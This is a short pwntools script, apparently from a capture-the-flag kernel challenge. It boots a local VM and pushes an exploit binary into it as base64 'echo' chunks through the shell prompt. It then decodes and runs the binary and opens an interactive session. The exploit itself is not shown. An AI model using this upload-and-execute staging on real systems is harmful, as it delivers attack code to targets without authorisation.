#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

import os

def send_cmd(cmd):
    r.sendlineafter("$", cmd)

r = process("./startvm.sh")

log.success("prepare empty binary...")



iii = open("./exp", "rb").read() # pwn binary

b64 = iii.encode('base64')
b64 = ''.join(b64.split("\n"))
now = 0

log.success("write base64 string to binary...")
seg = 500
while now < len(b64):
    cur = b64[now:now+seg:]
    cmd = "echo -ne \"{}\" >> poc".format(cur)
    log.info("sending {} / {} ...".format(now+seg, len(b64)))
    send_cmd(cmd)
    now += seg

log.success("base64 decoding...")
send_cmd("base64 -d poc > pwn")
send_cmd("chmod +x pwn")
send_cmd("./pwn")
r.interactive()
